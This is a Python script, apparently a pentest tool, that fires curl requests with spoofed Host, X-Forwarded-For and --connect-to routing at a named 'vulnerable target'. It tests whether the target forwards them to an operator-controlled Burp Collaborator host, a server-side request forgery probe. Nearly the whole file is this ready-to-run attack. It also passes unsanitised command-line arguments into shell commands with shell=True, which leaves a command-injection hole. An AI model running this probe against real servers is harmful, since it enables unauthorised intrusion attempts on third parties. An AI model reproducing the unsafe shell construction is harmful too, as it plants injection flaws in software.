import os
import argparse
import subprocess

def main():
    userAgent='Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0'
    tracker = " -H X-Tracking-Host:" + targetHost +" "
    userAgnt = " -H \"User-Agent:" + userAgent + "\" "
    print("###### Test 1 ######\r\n")
    subprocess.call('curl --connect-to '+collabHost +':443:'+ targetHost+':443 https://' + collabHost + proxy + ' -H X-Tracking-Type:1 ' + tracker + ' --connect-timeout 4 -svk --http1.1 '+ userAgnt, shell=True)
    print("###### Test 1a ######\r\n")
    subprocess.call('curl --connect-to '+collabHost +':443:'+ targetHost+':443 https://' + collabHost + proxy + ' -L -H X-Tracking-Type:1a ' + tracker + ' --connect-timeout 4 -svk --http1.1 '+ userAgnt, shell=True)
    print("\r\n\r\n\r\n###### Test 2 ######\r\n")
    subprocess.call('curl --connect-to '+collabHost +':443:'+ targetHost+':443 https://' + collabHost + proxy + ' -H X-Tracking-Type:2 ' + tracker + ' --connect-timeout 4 -svk --http1.1 -H X-Forwarded-For:'+collabHost + userAgnt, shell=True)
    print("\r\n\r\n\r\n###### Test 3 ######\r\n")
    #subprocess.call('curl --connect-to '+collabHost +':443:'+ targetHost+':80 https://' + collabHost + proxy + '  -H X-Tracking-Type:3 ' + tracker + ' --connect-timeout 4 -svk --http1.1 -H X-Forwarded-For:'+collabHost + userAgnt, shell=True)
    print("\r\n\r\n\r\n###### Test 4 ######\r\n")
    #subprocess.call('curl --connect-to '+collabHost +':443:'+ targetHost+':443 https://' + collabHost + proxy + ' --haproxy-protocol -H X-Tracking-Type:4 ' + tracker + ' --connect-timeout 4 -svk --http1.1 -H X-Forwarded-For:'+collabHost + userAgnt, shell=True)
    print("\r\n\r\n\r\n###### Test 5 ######\r\n")
    subprocess.call('curl --cipher DES-CBC3-SHA --connect-to '+collabHost +':443:'+ targetHost+':443 https://' + collabHost + proxy + ' -H X-Tracking-Type:5 ' + tracker + ' --connect-timeout 4 -svk --http1.1 -H X-Forwarded-For:'+collabHost + userAgnt, shell=True)
    print("\r\n\r\n\r\n###### Test 6 ######\r\n")
    subprocess.call('curl -H "Host:' + collabHost + '" https://' + targetHost + proxy + ' -H X-Tracking-Type:6 ' + tracker + ' --connect-timeout 4 -svk --http1.1 ' + userAgnt, shell=True)
         

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="specify the vulnerable target")
    parser.add_argument("-c", "--collab", help="specify your burp collab")
    parser.add_argument("-p", "--proxy", help="specify your proxy eg. http://127.0.0.1:8080")
    args = parser.parse_args()
    if args.target and args.collab:
        collabHost = args.collab
        targetHost = args.target
    else:
        parser.print_help()
        exit()
    if args.proxy is not None:
        proxy = " --proxy " + args.proxy + " "
    else:
        proxy = ""
    main()
